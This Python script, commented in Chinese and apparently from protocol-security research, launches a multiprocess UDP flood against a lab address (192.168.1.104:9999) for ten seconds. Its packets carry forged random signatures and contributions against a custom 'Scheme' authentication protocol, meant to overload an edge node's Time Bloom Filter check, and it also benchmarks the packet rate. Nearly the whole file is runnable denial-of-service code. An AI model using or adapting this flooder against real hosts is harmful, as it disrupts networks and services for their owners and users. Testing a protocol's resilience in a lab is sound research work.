import socket
import time
import struct
import os
import multiprocessing
import statistics

# ================= 配置 =================
TARGET_IP = '192.168.1.104'
TARGET_PORT = 9999

# 控制参数
SLEEP_INTERVAL = 0.001
# 原 DTLS 负载是 1400，加上头部约 1437 字节
# Scheme 头部开销大 (签名+贡献值)，为了保持总大小一致，需减少 Payload
# Fixed Header: 8(TS) + 4(Nonce) + 32(Contrib) + 512(Sig) = 556 bytes
# Target Payload = 1437 - 556 = 881 bytes
PAYLOAD_SIZE = 881
PROCESS_COUNT = multiprocessing.cpu_count()
ATTACK_DURATION = 10  # [修改] 攻击持续时间 (秒)


class SchemeAttacker:
    """
    构造基于自定义 Scheme 认证协议的攻击包
    目标：使包格式合法，但内容无法通过 Time Bloom Filter (tBF) 验证
    """
    #
    HASH_LEN = 32
    NUM_SUBKEYS = 16

    def __init__(self):

        pass

    def pack_malicious_record(self, payload, seq_num):

        ts = int(time.perf_counter() * 1000000)
        ts_bytes = struct.pack('!Q', ts)
        nonce_bytes = os.urandom(4)
        fake_contribution = os.urandom(self.HASH_LEN)
        fake_signature = os.urandom(self.HASH_LEN * self.NUM_SUBKEYS)
        packet = ts_bytes + nonce_bytes + fake_contribution + fake_signature + payload

        return packet


def run_benchmark(payload_size, iterations=1000):

    print(f"\n[Benchmark] Running Scheme packet generation benchmark ({iterations} iterations)...")
    attacker = SchemeAttacker()
    payload = os.urandom(payload_size)
    seq_num = 1

    times = []
    attacker.pack_malicious_record(payload, seq_num)

    for _ in range(iterations):
        start_time = time.perf_counter()
        attacker.pack_malicious_record(payload, seq_num)
        end_time = time.perf_counter()
        times.append((end_time - start_time) * 1_000_000)
        seq_num += 1

    avg_time = statistics.mean(times)
    pps = 1_000_000 / (avg_time + (SLEEP_INTERVAL * 1000_000))

    print(f"[Benchmark] Result (Scheme Packet):")
    print(f"   Avg Time: {avg_time:.2f} µs")
    print(f"   Theoretical Max PPS: {pps:.0f} packets/sec")
    print("-" * 40 + "\n")


def attack_worker(worker_id, target_ip, target_port, sleep_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)

    attacker = SchemeAttacker()
    seq_num = worker_id * 1000000

    base_payload = os.urandom(PAYLOAD_SIZE)

    print(f"[+] Worker {worker_id} started sending Scheme packets.")

    try:
        while True:
            seq_num += 1
            packet = attacker.pack_malicious_record(base_payload, seq_num)
            sock.sendto(packet, (target_ip, target_port))

            if sleep_time > 0:
                time.sleep(sleep_time)

    except Exception as e:
        print(f"Worker {worker_id} error: {e}")


if __name__ == "__main__":
    run_benchmark(PAYLOAD_SIZE)


    print(f"[*] Starting Scheme-based Flooding Attack to {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Target: Trigger tBF rejection on Edge Node.")
    print(f"[*] Attack will last for {ATTACK_DURATION} seconds.")

    processes = []
    try:
        for i in range(PROCESS_COUNT):
            p = multiprocessing.Process(
                target=attack_worker,
                args=(i, TARGET_IP, TARGET_PORT, SLEEP_INTERVAL)
            )
            p.daemon = True
            p.start()
            processes.append(p)

        time.sleep(ATTACK_DURATION)

        print(f"\n[!] Time is up ({ATTACK_DURATION}s). Stopping all workers...")

        for p in processes:
            p.terminate()
            p.join()

        print("[*] Attack finished.")

    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user early.")
        for p in processes:
            p.terminate()
            p.join()